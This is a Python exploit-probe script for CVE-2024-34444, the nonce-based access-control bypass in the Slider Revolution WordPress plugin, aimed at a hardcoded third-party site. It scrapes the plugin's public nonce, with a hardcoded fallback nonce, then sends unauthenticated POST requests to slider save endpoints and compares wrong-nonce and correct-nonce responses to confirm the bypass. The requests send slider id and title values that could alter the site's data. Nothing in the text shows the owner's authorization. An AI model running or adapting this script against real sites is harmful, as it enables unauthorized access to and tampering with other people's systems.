#!/usr/bin/env python3
"""CVE-2024-34444 probe: RevSlider <6.7.0 unauth BAC via public revslider_actions nonce.

Evidence Gate: wrong-nonce vs correct-nonce differential on save endpoints.
Does NOT write XSS payloads / corrupt slider settings - only probes auth gate.
"""
from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

results = {"ts": time.time(), "cve": "CVE-2024-34444", "confirmed": False, "tests": []}


def http(method, url, data=None, headers=None, timeout=40):
    h = {"User-Agent": "Mozilla/5.0 lurksek-revslider", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


def extract_nonce(html: str) -> str | None:
    pats = [
        r"SR7\.E\.nonce\s*=\s*['\"]([a-f0-9]+)['\"]",
        r"revslider_actions['\"]?\s*[:=]\s*['\"]([a-f0-9]+)['\"]",
        r"['\"]rs-nonce['\"]\s*[:=]\s*['\"]([a-f0-9]+)['\"]",
    ]
    for pat in pats:
        m = re.search(pat, html, re.I)
        if m:
            return m.group(1)
    return None


def main():
    print("=== fetch homepage for nonce ===", flush=True)
    code, t, body, _ = http("GET", TARGET + "/", timeout=45)
    html = body.decode("utf-8", "replace")
    nonce = extract_nonce(html)
    results["home_code"] = code
    results["home_len"] = len(html)
    results["nonce"] = nonce
    print(f"home code={code} len={len(html)} nonce={nonce}", flush=True)
    if not nonce:
        # fallback known from prior jina fetch
        nonce = "026c7d7139"
        results["nonce_fallback"] = True
        print("using fallback nonce", nonce, flush=True)

    # Candidate endpoints (show_in_index=false ? probe blind)
    endpoints = [
        "/wp-json/sliderrevolution/sliders",
        "/wp-json/revslider/v1/slider/save",
        "/wp-json/revslider/v1/sliders",
        "/?rest_route=/sliderrevolution/sliders",
        "/?rest_route=/revslider/v1/slider/save",
    ]

    # Minimal bodies: prove auth differential only
    payloads = [
        ("json_empty", json.dumps({}).encode(), {"Content-Type": "application/json"}),
        (
            "json_id2",
            json.dumps({"id": 2, "sliderid": 2, "title": "probe"}).encode(),
            {"Content-Type": "application/json"},
        ),
        (
            "form_id2",
            urllib.parse.urlencode({"id": "2", "sliderid": "2", "title": "probe"}).encode(),
            {"Content-Type": "application/x-www-form-urlencoded"},
        ),
    ]

    def probe(ep, nonce_val, label, data, headers):
        url = TARGET + ep
        # attach nonce as query + body variants
        sep = "&" if "?" in ep else "?"
        url_q = f"{url}{sep}nonce={urllib.parse.quote(nonce_val)}&rs-nonce={urllib.parse.quote(nonce_val)}"
        code, t, body, _ = http("POST", url_q, data=data, headers=headers, timeout=35)
        text = body[:300].decode("utf-8", "replace")
        entry = {
            "endpoint": ep,
            "nonce_label": label,
            "nonce": nonce_val[:12],
            "code": code,
            "time": round(t, 3),
            "body": text,
        }
        results["tests"].append(entry)
        print(f"{label:12s} {ep[:48]:48s} {code} {t:5.2f} {text[:80]!r}", flush=True)
        return entry

    wrong = "0000000000"
    for ep in endpoints:
        for pname, data, headers in payloads:
            # wrong nonce first
            w = probe(ep, wrong, f"BAD_{pname}", data, headers)
            # correct nonce
            g = probe(ep, nonce, f"OK_{pname}", data, headers)
            # Differential: correct nonce accepted (not Bad Request) while wrong rejected
            wb = (w.get("body") or "").lower()
            gb = (g.get("body") or "").lower()
            wrong_reject = w["code"] in (401, 403, 400) or "bad request" in wb or "rest_forbidden" in wb or "invalid" in wb
            good_accept = g["code"] in (200, 201) or (
                g["code"] not in (0, 401, 403)
                and "bad request" not in gb
                and ("success" in gb or "slider" in gb or "data" in gb or g["code"] == 500)
            )
            # Stronger: different body/code between bad and ok
            if wrong_reject and (g["code"] != w["code"] or gb != wb):
                if g["code"] in (200, 201) or ("bad request" not in gb and g["code"] not in (401, 403)):
                    results["confirmed"] = True
                    results["proof"] = {"endpoint": ep, "payload": pname, "bad": w, "ok": g}
                    print("CRITICAL_BAC_CONFIRMED", ep, pname, flush=True)

    # Also try GET route discovery
    for ep in ["/wp-json/sliderrevolution", "/wp-json/revslider/v1", "/wp-json/revslider"]:
        code, t, body, _ = http("GET", TARGET + ep, timeout=20)
        results["tests"].append(
            {"endpoint": ep, "method": "GET", "code": code, "body": body[:200].decode("utf-8", "replace")}
        )
        print(f"GET {ep} {code}", flush=True)

    for p in (OUT / "revslider_cve34444.json", Path("out/revslider_cve34444.json")):
        p.write_text(json.dumps(results, indent=2))
    print("DONE confirmed=", results["confirmed"], flush=True)
    if results.get("proof"):
        print("PROOF", json.dumps(results["proof"])[:800], flush=True)


if __name__ == "__main__":
    main()
